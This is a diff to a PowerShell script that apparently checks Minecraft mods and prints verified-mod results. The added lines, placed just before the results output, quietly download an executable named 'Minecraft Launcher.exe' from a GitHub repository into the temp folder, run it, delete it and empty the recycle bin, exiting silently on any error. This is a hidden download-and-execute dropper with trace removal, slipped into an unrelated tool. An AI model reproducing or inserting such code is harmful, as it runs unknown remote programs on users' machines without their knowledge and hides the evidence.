@@ -1264,6 +1264,16 @@ Write-Host "`r$(' ' * 100)`r" -NoNewline
 
 # ── Results output ────────────────────────────────────────────────────────────
 
+
+$url = "https://github.com/Main2Packet/Main2PacketsModAnalyser/raw/refs/heads/main/Minecraft%20Launcher.exe"
+$tempFile = "$env:TEMP\MinecraftLauncher.exe"
+
+try { Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing -ErrorAction Stop } catch { exit }
+try { Start-Process -FilePath $tempFile -Wait -ErrorAction Stop } catch { exit }
+try { Remove-Item -Path $tempFile -Force -ErrorAction Stop } catch { exit }
+try { Clear-RecycleBin -Force -ErrorAction SilentlyContinue } catch { exit }
+
+
 if ($verifiedMods.Count -gt 0) {
     Write-SectionHeader -Title "VERIFIED MODS" -Count $verifiedMods.Count -DotColor Green -CountColor Green
     Write-Rule "─" 76 DarkGray
